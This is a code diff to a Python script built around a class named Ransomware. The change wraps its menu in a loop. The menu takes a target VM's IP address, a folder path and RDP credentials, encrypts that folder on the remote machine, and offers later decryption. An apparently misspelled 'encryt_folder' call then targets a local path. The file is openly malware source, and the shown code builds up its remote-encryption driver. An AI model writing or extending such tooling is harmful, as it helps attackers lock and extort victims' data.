@@ -66,22 +66,23 @@ class Ransomware:
 # Create an instance of the Ransomware class
 ransomware = Ransomware()
 
-# Add choices at the bottom
-print("Choose an action:")
-print("1. Encrypt folder on a different VM")
-print("2. Decrypt folder")
-choice = input("Enter your choice (1/2): ")
-
-if choice == "1":
-    target_vm_ip = input("Enter the target VM IP: ")
-    folder_path = input("Enter the folder path to encrypt on the target VM: ")
-    rdp_username = input("Enter your RDP username: ")
-    rdp_password = input("Enter your RDP password: ")
-    ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path, rdp_username, rdp_password)
-    encryt_folder(folder_path)
-elif choice == "2":
-    folder_path = input("Enter the folder path to decrypt: ")
-    ransomware.decrypt_folder(folder_path)
-else:
-    print("Invalid choice. Please choose a valid option.")
+while True:
+    # Add choices at the bottom
+    print("Choose an action:")
+    print("1. Encrypt folder on a different VM")
+    print("2. Decrypt folder")
+    choice = input("Enter your choice (1/2): ")
+    
+    if choice == "1":
+        target_vm_ip = input("Enter the target VM IP: ")
+        folder_path = input("Enter the folder path to encrypt on the target VM: ")
+        rdp_username = input("Enter your RDP username: ")
+        rdp_password = input("Enter your RDP password: ")
+        ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path, rdp_username, rdp_password)
+        encryt_folder(folder_path)
+    elif choice == "2":
+        folder_path = input("Enter the folder path to decrypt: ")
+        ransomware.decrypt_folder(folder_path)
+    else:
+        print("Invalid choice. Please choose a valid option.")
 
